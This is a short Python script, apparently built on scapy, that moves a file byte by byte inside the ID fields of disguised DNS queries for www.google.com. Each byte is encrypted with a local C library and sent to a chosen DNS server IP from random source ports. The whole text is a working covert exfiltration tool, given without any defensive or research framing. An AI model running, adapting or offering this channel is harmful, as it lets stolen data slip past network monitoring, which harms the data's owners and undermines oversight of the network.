#!/usr/bin/python
import sys
import argparse
from scapy.all import *
import ctypes
# helpers
def ip_to_uint32(ip):
	t = socket.inet_aton(ip)
	return struct.unpack("I", t)[0]

def uint32_to_ip(ipn):
	t = struct.pack("I", ipn)
	return socket.inet_ntoa(t)

#MAIN
parser = argparse.ArgumentParser(description='Send a file using dns id fields')
parser.add_argument('infile', metavar='File')
parser.add_argument('--ci', required=True, metavar='Client IP',help='Client ip address', dest='client_ip')
parser.add_argument('--si', required=True, metavar='Server IP',help='DNS Server ip address',dest='dns_resolver_ip')
args = parser.parse_args()
print args
# Load some C libs
dnscc_lib = ctypes.cdll.LoadLibrary("./libdnscc_crypt.so")
dnscc_lib.dnscc_crypt_init();
fread_lib = ctypes.cdll.LoadLibrary("./freadlib.so")
#We really should test, if the file exist
fread_lib.open_fread(args.infile)
#Static stuff
#client_ip = "192.168.52.1"
#dns_resolver_ip = "192.168.52.30"
dns_dport = 53
#read the file size, and set the pos to 0
file_size = fread_lib.read_size();
pos = 0
#send the file
while pos <= file_size:
	dns_sport = random.randrange(10000,60000,1) #random source port
	dns_id = fread_lib.read_byte(pos) #read a byte @ pos
	dns_id = dnscc_lib.dnscc_crypt(dns_id,socket.htons(dns_sport),socket.htons(dns_dport),ip_to_uint32(args.client_ip),ip_to_uint32(args.dns_resolver_ip)) #encode the data into the dns id with d3des
	send(IP(dst=args.dns_resolver_ip)/UDP(sport=dns_sport,dport=dns_dport)/DNS(id=dns_id,rd=1,qd=DNSQR(qname="www.google.com", qtype="A")));#send the packet
	pos = pos + 1 # pos + 1 :)
fread_lib.close_fread() #close the file
